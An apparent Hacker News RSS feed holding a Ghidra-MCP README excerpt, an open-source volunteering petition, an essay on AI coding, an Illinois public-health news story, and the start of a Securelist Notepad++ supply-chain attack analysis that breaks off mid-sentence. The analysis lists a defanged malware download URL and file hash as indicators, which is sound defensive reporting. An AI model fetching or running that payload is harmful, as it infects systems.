<p dir="auto"><h3 tabindex="-1" dir="auto">Type System</h3><a id="user-content-type-system" aria-label="Permalink: Type System" href="#type-system"></a></p>
<ul dir="auto">
<li><code>set_function_prototype</code> - Set function signature</li>
<li><code>set_local_variable_type</code> - Set variable type</li>
<li><code>set_parameter_type</code> - Set parameter type</li>
<li><code>batch_set_variable_types</code> - Bulk type setting</li>
<li><code>set_variable_storage</code> - Control variable storage location</li>
<li><code>set_function_no_return</code> - Mark function as non-returning</li>
<li><code>list_calling_conventions</code> - Available calling conventions</li>
<li><code>get_function_variables</code> - Get all function variables</li>
<li><code>get_function_labels</code> - Get labels in function</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Ghidra Script Management</h3><a id="user-content-ghidra-script-management" aria-label="Permalink: Ghidra Script Management" href="#ghidra-script-management"></a></p>
<ul dir="auto">
<li><code>list_scripts</code> - List available scripts</li>
<li><code>run_script</code> - Run a script</li>
<li><code>list_ghidra_scripts</code> - List custom Ghidra scripts</li>
<li><code>save_ghidra_script</code> - Save new script</li>
<li><code>get_ghidra_script</code> - Get script contents</li>
<li><code>run_ghidra_script</code> - Execute Ghidra script</li>
<li><code>update_ghidra_script</code> - Update existing script</li>
<li><code>delete_ghidra_script</code> - Delete script</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Multi-Program Support</h3><a id="user-content-multi-program-support" aria-label="Permalink: Multi-Program Support" href="#multi-program-support"></a></p>
<ul dir="auto">
<li><code>list_open_programs</code> - List all open programs</li>
<li><code>get_current_program_info</code> - Current program details</li>
<li><code>switch_program</code> - Switch active program</li>
<li><code>list_project_files</code> - List project files</li>
<li><code>open_program</code> - Open program from project</li>
<li><code>compare_programs_documentation</code> - Compare documentation between programs</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Analysis Tools</h3><a id="user-content-analysis-tools" aria-label="Permalink: Analysis Tools" href="#analysis-tools"></a></p>
<ul dir="auto">
<li><code>find_next_undefined_function</code> - Find undefined functions</li>
<li><code>find_undocumented_by_string</code> - Find functions by string reference</li>
<li><code>batch_string_anchor_report</code> - String anchor analysis</li>
<li><code>search_byte_patterns</code> - Search for byte patterns</li>
<li><code>get_assembly_context</code> - Get assembly context</li>
<li><code>analyze_struct_field_usage</code> - Analyze structure field access</li>
<li><code>get_field_access_context</code> - Get field access patterns</li>
<li><code>create_function</code> - Create function at address</li>
<li><code>get_function_jump_target_addresses</code> - Get jump targets</li>
</ul>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/README.md">docs/README.md</a> for complete documentation.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🏗️ Architecture</h2><a id="user-content-️-architecture" aria-label="Permalink: 🏗️ Architecture" href="#️-architecture"></a></p>
<div data-snippet-clipboard-copy-content="┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   AI/Automation │◄──►│   MCP Bridge    │◄──►│  Ghidra Plugin  │
│     Tools       │    │ (bridge_mcp_    │    │ (GhidraMCP.jar) │
│  (Claude, etc.) │    │  ghidra.py)     │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
   MCP Protocol            HTTP REST              Ghidra API
   (stdio/SSE)          (localhost:8080)      (Program, Listing)"><pre><code>┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   AI/Automation │◄──►│   MCP Bridge    │◄──►│  Ghidra Plugin  │
│     Tools       │    │ (bridge_mcp_    │    │ (GhidraMCP.jar) │
│  (Claude, etc.) │    │  ghidra.py)     │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
   MCP Protocol            HTTP REST              Ghidra API
   (stdio/SSE)          (localhost:8080)      (Program, Listing)
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Components</h3><a id="user-content-components" aria-label="Permalink: Components" href="#components"></a></p>
<ul dir="auto">
<li><strong>bridge_mcp_ghidra.py</strong> - Python MCP server that translates MCP protocol to HTTP calls</li>
<li><strong>GhidraMCP.jar</strong> - Ghidra plugin that exposes analysis capabilities via HTTP</li>
<li><strong>ghidra_scripts/</strong> - Collection of 70+ automation scripts for common tasks</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔧 Development</h2><a id="user-content--development" aria-label="Permalink: 🔧 Development" href="#-development"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building from Source</h3><a id="user-content-building-from-source" aria-label="Permalink: Building from Source" href="#building-from-source"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Build the plugin (skip integration tests)
mvn clean package assembly:single -DskipTests

# Deploy to Ghidra
.\deploy-to-ghidra.ps1"><pre><span><span>#</span> Build the plugin (skip integration tests)</span>
mvn clean package assembly:single -DskipTests

<span><span>#</span> Deploy to Ghidra</span>
.<span>\d</span>eploy-to-ghidra.ps1</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Project Structure</h3><a id="user-content-project-structure" aria-label="Permalink: Project Structure" href="#project-structure"></a></p>
<div data-snippet-clipboard-copy-content="ghidra-mcp/
├── bridge_mcp_ghidra.py     # MCP server (Python)
├── src/main/java/           # Ghidra plugin (Java)
├── lib/                     # Ghidra library dependencies
├── ghidra_scripts/          # 70+ automation scripts
├── docs/                    # Documentation
│   ├── prompts/            # AI workflow prompts
│   ├── releases/           # Version release notes
│   └── project-management/ # Project docs
├── examples/                # Example usage
└── scripts/                 # Build/utility scripts"><pre><code>ghidra-mcp/
├── bridge_mcp_ghidra.py     # MCP server (Python)
├── src/main/java/           # Ghidra plugin (Java)
├── lib/                     # Ghidra library dependencies
├── ghidra_scripts/          # 70+ automation scripts
├── docs/                    # Documentation
│   ├── prompts/            # AI workflow prompts
│   ├── releases/           # Version release notes
│   └── project-management/ # Project docs
├── examples/                # Example usage
└── scripts/                 # Build/utility scripts
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Library Dependencies</h3><a id="user-content-library-dependencies" aria-label="Permalink: Library Dependencies" href="#library-dependencies"></a></p>
<p dir="auto">The <code>lib/</code> folder must contain Ghidra JAR files for compilation. Run the provided script to copy them from your Ghidra installation:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows
copy-ghidra-libs.bat &quot;C:\path\to\ghidra_12.0.2_PUBLIC&quot;

# Or manually copy from your Ghidra installation"><pre><span><span>#</span> Windows</span>
copy-ghidra-libs.bat <span><span>"</span>C:\path\to\ghidra_12.0.2_PUBLIC<span>"</span></span>

<span><span>#</span> Or manually copy from your Ghidra installation</span></pre></div>
<p dir="auto"><strong>Required Libraries (14 JARs, ~37MB):</strong></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Library</th>
<th>Source Path</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Base.jar</strong></td>
<td><code>Features/Base/lib/</code></td>
<td>Core Ghidra functionality</td>
</tr>
<tr>
<td><strong>Decompiler.jar</strong></td>
<td><code>Features/Decompiler/lib/</code></td>
<td>Decompilation engine</td>
</tr>
<tr>
<td><strong>PDB.jar</strong></td>
<td><code>Features/PDB/lib/</code></td>
<td>Microsoft PDB symbol support</td>
</tr>
<tr>
<td><strong>FunctionID.jar</strong></td>
<td><code>Features/FunctionID/lib/</code></td>
<td>Function identification</td>
</tr>
<tr>
<td><strong>SoftwareModeling.jar</strong></td>
<td><code>Framework/SoftwareModeling/lib/</code></td>
<td>Program model API</td>
</tr>
<tr>
<td><strong>Project.jar</strong></td>
<td><code>Framework/Project/lib/</code></td>
<td>Project management</td>
</tr>
<tr>
<td><strong>Docking.jar</strong></td>
<td><code>Framework/Docking/lib/</code></td>
<td>UI docking framework</td>
</tr>
<tr>
<td><strong>Generic.jar</strong></td>
<td><code>Framework/Generic/lib/</code></td>
<td>Generic utilities</td>
</tr>
<tr>
<td><strong>Utility.jar</strong></td>
<td><code>Framework/Utility/lib/</code></td>
<td>Core utilities</td>
</tr>
<tr>
<td><strong>Gui.jar</strong></td>
<td><code>Framework/Gui/lib/</code></td>
<td>GUI components</td>
</tr>
<tr>
<td><strong>FileSystem.jar</strong></td>
<td><code>Framework/FileSystem/lib/</code></td>
<td>File system support</td>
</tr>
<tr>
<td><strong>Graph.jar</strong></td>
<td><code>Framework/Graph/lib/</code></td>
<td>Graph/call graph analysis</td>
</tr>
<tr>
<td><strong>DB.jar</strong></td>
<td><code>Framework/DB/lib/</code></td>
<td>Database operations</td>
</tr>
<tr>
<td><strong>Emulation.jar</strong></td>
<td><code>Framework/Emulation/lib/</code></td>
<td>P-code emulation</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<blockquote>
<p dir="auto"><strong>Note</strong>: Libraries are NOT included in the repository (see <code>.gitignore</code>). You must copy them from your Ghidra installation before building.</p>
</blockquote>
<p dir="auto"><h3 tabindex="-1" dir="auto">Development Features</h3><a id="user-content-development-features" aria-label="Permalink: Development Features" href="#development-features"></a></p>
<ul dir="auto">
<li><strong>Automated Deployment</strong>: Version-aware deployment script</li>
<li><strong>Batch Operations</strong>: Reduces API calls by 93%</li>
<li><strong>Atomic Transactions</strong>: All-or-nothing semantics</li>
<li><strong>Comprehensive Logging</strong>: Debug and trace capabilities</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">📚 Documentation</h2><a id="user-content--documentation" aria-label="Permalink: 📚 Documentation" href="#-documentation"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core Documentation</h3><a id="user-content-core-documentation" aria-label="Permalink: Core Documentation" href="#core-documentation"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/README.md">Documentation Index</a> - Complete documentation navigation</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/PROJECT_STRUCTURE.md">Project Structure</a> - Project organization guide</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/NAMING_CONVENTIONS.md">Naming Conventions</a> - Code naming standards</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/HUNGARIAN_NOTATION.md">Hungarian Notation</a> - Variable naming guide</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">AI Workflow Prompts</h3><a id="user-content-ai-workflow-prompts" aria-label="Permalink: AI Workflow Prompts" href="#ai-workflow-prompts"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/README.md">Prompts Overview</a> - AI prompting system guide</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/FUNCTION_DOC_WORKFLOW_V4.md">Function Documentation Workflow</a> - Complete workflow</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/QUICK_START_PROMPT.md">Quick Start Prompt</a> - Simplified beginner workflow</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/CROSS_VERSION_MATCHING_COMPREHENSIVE.md">Cross-Version Matching</a> - Hash-based matching</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Release History</h3><a id="user-content-release-history" aria-label="Permalink: Release History" href="#release-history"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md">Complete Changelog</a> - All version release notes</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/releases">Release Notes</a> - Detailed release documentation</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🤝 Contributing</h2><a id="user-content--contributing" aria-label="Permalink: 🤝 Contributing" href="#-contributing"></a></p>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for detailed contribution guidelines.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Quick Start</h3><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<ol dir="auto">
<li>Fork the repository</li>
<li>Create a feature branch (<code>git checkout -b feature/amazing-feature</code>)</li>
<li>Build and test your changes (<code>mvn clean package assembly:single -DskipTests</code>)</li>
<li>Update documentation as needed</li>
<li>Commit your changes (<code>git commit -m 'Add amazing feature'</code>)</li>
<li>Push to the branch (<code>git push origin feature/amazing-feature</code>)</li>
<li>Open a Pull Request</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">📄 License</h2><a id="user-content--license" aria-label="Permalink: 📄 License" href="#-license"></a></p>
<p dir="auto">This project is licensed under the Apache License 2.0 - see the <a href="https://github.com/bethington/ghidra-mcp/blob/main/LICENSE">LICENSE</a> file for details.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🏆 Production Status</h2><a id="user-content--production-status" aria-label="Permalink: 🏆 Production Status" href="#-production-status"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Version</strong></td>
<td>2.0.0</td>
</tr>
<tr>
<td><strong>MCP Tools</strong></td>
<td>110 fully implemented</td>
</tr>
<tr>
<td><strong>Compilation</strong></td>
<td>✅ 100% success</td>
</tr>
<tr>
<td><strong>Batch Efficiency</strong></td>
<td>93% API call reduction</td>
</tr>
<tr>
<td><strong>Ghidra Scripts</strong></td>
<td>70+ automation scripts</td>
</tr>
<tr>
<td><strong>Documentation</strong></td>
<td>Comprehensive with AI prompts</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md">CHANGELOG.md</a> for version history and release notes.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🙏 Acknowledgments</h2><a id="user-content--acknowledgments" aria-label="Permalink: 🙏 Acknowledgments" href="#-acknowledgments"></a></p>
<ul dir="auto">
<li><strong>Ghidra Team</strong> - For the incredible reverse engineering platform</li>
<li><strong>Model Context Protocol</strong> - For the standardized AI integration framework</li>
<li><strong>Contributors</strong> - For testing, feedback, and improvements</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔗 Related Projects</h2><a id="user-content--related-projects" aria-label="Permalink: 🔗 Related Projects" href="#-related-projects"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/re-universe">re-universe</a> — Ghidra BSim PostgreSQL platform for large-scale binary similarity analysis. Pairs perfectly with GhidraMCP for AI-driven reverse engineering workflows.</li>
<li><a href="https://github.com/bethington/cheat-engine-server-python">cheat-engine-server-python</a> — MCP server for dynamic memory analysis and debugging.</li>
</ul>
<hr>
<p dir="auto"><strong>Ready for production deployment with enterprise-grade reliability and comprehensive binary analysis capabilities.</strong></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Petition for Recognition of Work on Open-Source as Volunteering in Germany (198 pts)]]></title>
            <link>https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</link>
            <guid>46881568</guid>
            <pubDate>Wed, 04 Feb 2026 04:46:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany">https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</a>, See on <a href="https://news.ycombinator.com/item?id=46881568">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div dir="ltr" lang="en">
			<p>
				<strong>Petition richtet sich an:</strong>
									German Bundestag, Petition Committee							</p>

			<!--marker--><p>Open-Source-Software builds the foundations of digital infrastructure in big parts - in administration, economy, science and daily life. Even the current <b>coalition agreement</b> of the <b>Federal Government</b> mentions Open-Source-Software as a fundamental building block for the achievement of <b>digital sovereignty</b>.</p><p>However, the work done by thousands of volunteers for this goal is <b>not recognised as volunteering</b>, neither fiscally nor in terms of funding. This imbalance between societal importance and legal status has to be corrected.</p><p>Therefore, as an active contributor to Open-Source-Projects, I call for work on Open-Source to be recognised as <b>volunteering for the common good</b> – of equal rank as volunteer work for associations, youth work or ambulance service.</p>		</div>

					<h4>Begründung</h4>

			<div dir="ltr" lang="en">
				<!--marker--><p><b>1. Open-Source contributes evidently to the common good</b></p><ul><li>It is creating <b>free, transparent and auditable software</b> that is available for everyone.</li><li>Critical systems like <b>internet protocols, security libraries, health IT, AI frameworks, energy management, education technologies </b>and<b> communication tools</b> are based significantly on volunteer contributions.</li><li>Without this work, Germany would be <b>digitally more dependent, less secure </b>and<b> less inventive.</b></li></ul><p>Orientation on the common good is a central criterion for volunteering – and Open-Source fulfils it to the highest degree.</p><p><b>2. This work predominantly happens unpaid – and is voluntary civilian commitment</b></p><ul><li>The majority of all work on development, maintenance and documentation happens voluntarily in leisure time.</li><li>Contributors take responsibility for security, stability and advancement of central software components, without getting paid and often recognised.</li><li>The commitment is <b>comparable to work in associations for the public good</b>, but digitally.</li></ul><p>The legal equalisation with traditional volunteering is therefore coherent.</p><p><b>3. Societal dependence without appreciation</b></p><ul><li>State facilities, town councils, schools and enterprises <b>profit directly</b> from Open-Source libraries, frameworks and tools.</li><li>Security vulnerabilities like "Heartbleed" or "Log4Shell" have shown the importance of work by maintainers for the <b>protection of the public</b>.</li><li>Concurrently, resources and structures are lacking, as the work is <b>not formally recognised as volunteering</b> – and does therefore <i>not receive taxable or organisational benefits</i>.</li></ul><p>This creates an <b>imbalance of responsibilities</b> that lies on few volunteers, while millions of users are profiting.</p><p><b>4. Recognition as volunteering would create legal clarity</b><br>Possible results of formal recognition:</p><ul><li><b>Compensations </b>could be <b>paid tax-exempt </b>(Ehrenamtspauschale/Übungsleiterpauschale).</li><li><b>Open-Source projects for the common good</b> could more easily receive a classification as per §52 AO.</li><li>Contributors could get a better position in issues of liability (similar to §31a BGB for an Association's Board).</li><li>Projects could legally reimburse expenses and issue donation receipts.</li></ul><p>This creates <b>transparency, legal clarity and sustainability</b> in digital volunteer work.</p><p><b>5. Digitalisation needs competent volunteers – and those deserve funding</b></p><ul><li>Open-Source commitment requires high technical competence</li><li>Volunteer developers perform work, that companies would otherwise need to buy for high hourly rates.</li><li>The state invests billions in digitalisation, but ignores the people who maintain the technological foundation <b>voluntarily</b>.</li></ul><p>Recognition as volunteer work would be a <b>cost-efficient contribution to digital sovereignty</b> in Germany.</p><p><b>6. Germany limps behind internationally</b><br>Other countries are already funding commitment to Open-Source through: </p><ul><li>Taxable benefits</li><li>Institutional support</li><li>Recognition of software development for the public good</li></ul><p>Germany is risking to fall behind in international competition, if volunteers in the digital realm are <b>structurally disadvantaged</b> further.</p>			</div>
		
					
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I miss thinking hard (1071 pts)]]></title>
            <link>https://www.jernesto.com/articles/thinking_hard</link>
            <guid>46881264</guid>
            <pubDate>Wed, 04 Feb 2026 03:54:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jernesto.com/articles/thinking_hard">https://www.jernesto.com/articles/thinking_hard</a>, See on <a href="https://news.ycombinator.com/item?id=46881264">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>Before you read this post, ask yourself a question: <strong>When was the last time you truly thought hard?</strong></p>

<p>By “thinking hard,” I mean encountering a specific, difficult problem and spending multiple days just sitting with it to overcome it. </p>

<p>a) All the time. 
b) Never. 
c) Somewhere in between.</p>

<p>If your answer is (a) or (b), this post isn't for you. But if, like me, your response is (c), you might get something out of this, if only the feeling that you aren't alone.</p>

<p>First, a disclaimer: this post has no answers, not even suggestions. It is simply a way to vent something I've been feeling for the last few months.</p>

<h3 id="the-builder-and-the-thinker">The Builder and The Thinker</h3>

<p>I believe my personality is built on two primary traits:</p>

<ol>
<li><p><strong>The Builder</strong> (The desire to create, ship, and be pragmatic).</p></li>
<li><p><strong>The Thinker</strong> (The need for deep, prolonged mental struggle).</p></li>
</ol>

<p>The builder is pretty self explanatory, it’s motivated by velocity and utility. It is the part of me that craves the transition from “idea” to “reality.” It loves the dopamine hit of a successful deploy, the satisfaction of building systems to solve real problems, and the knowledge that someone, somewhere, is using my tool.</p>

<p>To explain the Thinker , I need to go back to my university days studying physics. Every now and then, we would get homework problems that were significantly harder than average. Even if you had a decent grasp of the subject, just coming up with an approach was difficult.</p>

<p>I observed that students fell into three categories when facing these problems (well, four, if you count the 1% of geniuses for whom no problem was too hard).</p>

<ul>
<li><p><strong>Type 1:</strong> The majority. After a few tries, they gave up and went to the professor or a TA for help.</p></li>
<li><p><strong>Type 2:</strong> The Researchers. They went to the library to look for similar problems or insights to make the problem approachable. They usually succeeded.</p></li>
<li><p><strong>Type 3:</strong> The Thinkers.</p></li>
</ul>

<p>I fell into the third category, which, in my experience, was almost as rare as the genius 1%. My method was simply to think. To think hard and long. Often for several days or weeks, all my non-I/O brain time was relentlessly chewing on possible ways to solve the problem, even while I was asleep.</p>

<p>This method never failed me. I always felt that deep prolonged thinking was my superpower. I might not be as fast or naturally gifted as the top 1%, but given enough time, I was confident I could solve anything. I felt a deep satisfaction in that process.</p>

<h3 id="the-conflict-with-ai">The Conflict with AI</h3>

<p>That satisfaction is why software engineering was initially so gratifying. It hit the right balance. It satisfied <strong>The Builder</strong> (feeling productive and pragmatic by creating useful things) and <strong>The Thinker</strong> (solving really hard problems). Thinking back, the projects where I grew the most as an engineer were always the ones with a good number of really hard problems that needed creative solutions.</p>

<p>But recently, the number of times I truly ponder a problem for more than a couple of hours has decreased tremendously.</p>

<p>Yes, <strong>I blame AI for this</strong>.</p>

<p>I am currently writing much more, and more complicated software than ever, yet I feel I am not growing as an engineer at all. When I started meditating on why I felt “stuck,” I realized I am starving <strong>The Thinker</strong>.</p>

<p>“Vibe coding” satisfies the Builder. It feels great to see to pass from idea to reality in a fraction of a time that would take otherwise. But it has drastically cut the times I need to came up with creative solutions for technical problems. I know many people who are purely Builders, for them this era is the best thing that ever happened. But for me, something is missing.</p>

<h3 id="the-trap-of-pragmatism">The Trap of Pragmatism</h3>

<p>I know what you might be thinking: "If you can ‘vibe code’ your way through it, the problem wasn’t actually hard."</p>

<p>I think that misses the point.  It’s not that AI is good for hard problems, it’s not even that good for easy problems. I’m confident that my third manual rewrite of a module would be much better than anything the AI can output. But I am also a pragmatist.</p>

<p>If I can get a solution that is “close enough” in a fraction of the time and effort, it is irrational not to take the AI route. And that is the real problem: <strong>I cannot simply turn off my pragmatism.</strong></p>

<p>At the end of the day, I am a Builder. I like building things. The faster I build, the better. Even if I wanted to reject AI and go back to the days where the Thinker's needs were met by coding, the Builder in me would struggle with the inefficiency.</p>

<p>Even though the AI almost certainly won't come up with a 100% satisfying solution, the 70% solution it achieves usually hits the “good enough” mark.</p>

<h3 id="so-what-now">So, what now?</h3>

<p>To be honest, I don’t know. I am still figuring it out.</p>

<p>I'm not sure if my two halves can be satisfied by coding anymore. You can always aim for harder projects, hoping to find problems where AI fails completely. I still encounter those occasionally, but the number of problems requiring deep creative solutions feels like it is diminishing rapidly.</p>

<p>I have tried to get that feeling of mental growth outside of coding. I tried getting back in touch with physics, reading old textbooks. But that wasn’t successful either. It is hard to justify spending time and mental effort solving physics problems that aren’t relevant or state-of-the-art when I know I could be building things.</p>

<p>My Builder side won’t let me just sit and think about unsolved problems, and my Thinker side is starving while I vibe-code. I am not sure if there will ever be a time again when both needs can be met at once.  </p>

<p> "Now we have the right to give this being the well-known name that always designates what no power of imagination, no flight of the boldest fantasy, no intently devout heart, no abstract thinking however profound, no enraptured and transported spirit has ever attained: God. But this basic unity is of the past; it no longer is. It has, by changing its being, totally and completely shattered itself. God has died and his death was the life of the world." <br>
-  Philipp Mainländer </p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Illinois joins WHO global outbreak network after U.S. withdraws (128 pts)]]></title>
            <link>https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</link>
            <guid>46879447</guid>
            <pubDate>Wed, 04 Feb 2026 00:15:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/">https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</a>, See on <a href="https://news.ycombinator.com/item?id=46879447">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
								
<p>Illinois will join the World Health Organization’s Global Outbreak Alert and Response Network, or GOARN, to counterbalance the federal government’s withdrawal, Gov. JB Pritzker announced Tuesday.</p>
<p>The network monitors disease outbreaks across the globe and prepares countries to respond to those outbreaks. As a member, Illinois will have access to research, timely alerts and information about outbreaks, risk assessments and trainings so state officials can respond to public health emergencies.</p>
<p>The move follows President Donald Trump leaving the international health organization in January 2025.​</p>
<p>“By withdrawing from the World Health Organization, Donald Trump has undermined science and weakened our nation’s ability to detect and respond to global health threats,” Pritzker said in a news release. “I refuse to sit idly by and let that happen.”</p>
<p>Many WHO meetings involve national governments around the world, but <a href="https://goarn.who.int/about" target="_blank" rel="noopener">GOARN</a> is open to a wider variety of groups. It connects hundreds of public institutions, laboratories, academic institutions and different levels of government to detect and respond to public health threats like COVID-19, influenza and other diseases.</p>
<p>“Membership in this network strengthens Illinois’ preparedness for future pandemics and emerging threats,” the release states.</p>
<p>Illinois will bring laboratory capacity to the organization, including genomic sequencing and wastewater surveillance developed for COVID-19. Illinois also provides expertise in outbreak investigations and communication about risk.</p>
<p>Already, the Illinois Department of Public Health collects data and information about emerging health risks, and that will continue.</p>
<p>“Disease knows no borders,” said Dr. Sameer Vohra, director of IDPH. “The decision by the U.S. government to withdraw from the World Health Organization threatens decades of progress in global health coordination that makes Illinois residents safer.”</p>
<p>Joining GOARN is another move Pritzker has made to counter federal public health policies.</p>
<p>Pritzker in 2025 <a href="https://capitolnewsillinois.com/news/pritzker-signs-bill-allowing-illinois-to-issue-state-specific-vaccine-guidelines/" target="_blank" rel="noopener">signed a bill</a> to allow IDPH to set its own vaccine guidelines. It also requires insurance companies to cover vaccines that are recommended by IDPH.</p>
<p>He also <a href="https://gov-pritzker-newsroom.prezly.com/gov-pritzker-joins-launch-of-governors-public-health-alliance-to-protect-illinoisians-from-trumps-attack-on-science" target="_blank" rel="noopener">joined the Governors Public Health Alliance</a>, a group of 15 other governors that coordinates to monitor public health threats, share information and communicate with the global health community.</p>
<p>California <a href="https://www.npr.org/2026/01/28/g-s1-107526/california-world-health-organization-infectious-diseases" target="_blank" rel="noopener">also joined GOARN</a> in late January.</p>
<p>The <a href="https://www.npr.org/2026/01/20/g-s1-106126/trump-world-health-organization-withdrawal" target="_blank" rel="noopener">withdrawal is complicated</a> because there is no official way to leave WHO and the United States is the only country with the ability to do so. Experts say it’s up to WHO members when the departure is finalized, and they expect the matter to come up in meetings in February and May.</p>
<p>Leaving WHO doesn’t mean leaving all global health efforts. The U.S. will still participate in organizations like UNICEF and the United Nations Children’s Fund.</p>
<p>Trump tried in 2020 to leave WHO, but President Joe Biden reversed that decision. Trump has accused WHO of not being independent and has demanded reforms without clarifying what those are. He has also criticized the way WHO handled the COVID-19 pandemic.</p>
<p>Tom Hughes, executive director of the Illinois Public Health Association, praised the announcement, emphasizing how strong systems and partnerships are crucial to public health.</p>
<p>“Public health works best when we are informed, connected, and prepared,” he said. “Joining GOARN means Illinois public health leaders can access timely, reliable information, global expertise, and trusted partners when it matters most.”</p>
<p><a href="https://capitolnewsillinois.com/" target="_blank" rel="noopener"><em>Capitol News Illinois</em></a><em> is a nonprofit, nonpartisan news service that distributes state government coverage to hundreds of news outlets statewide. It is funded primarily by the Illinois Press Foundation and the Robert R. McCormick Foundation.</em></p>
								
								
																	
															</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notepad++ supply chain attack breakdown (348 pts)]]></title>
            <link>https://securelist.com/notepad-supply-chain-attack/118708/</link>
            <guid>46878338</guid>
            <pubDate>Tue, 03 Feb 2026 22:35:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://securelist.com/notepad-supply-chain-attack/118708/">https://securelist.com/notepad-supply-chain-attack/118708/</a>, See on <a href="https://news.ycombinator.com/item?id=46878338">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
													<h2 id="introduction">Introduction</h2>
<p>On February 2, 2026, the developers of Notepad++, a text editor popular among developers, <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/" target="_blank">published a statement</a> claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.</p>
<h2 id="multiple-execution-chains-and-payloads">Multiple execution chains and payloads</h2>
<p>Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.</p>
<p>We observed three different infection chains overall designed to attack about a dozen machines, belonging to:</p>
<ul>
<li>Individuals located in Vietnam, El Salvador and Australia;</li>
<li>A government organization located in the Philippines;</li>
<li>A financial organization located in El Salvador;</li>
<li>An IT service provider organization located in Vietnam.</li>
</ul>
<p>Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.</p>
<p>In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it. </p>
<h3 id="chain-1-late-july-and-early-august-2025">Chain #1 — late July and early August 2025</h3>
<p>We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan  of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.</p>
<p>The <code>update.exe</code> file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, <code>GUP.exe</code>. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:</p>
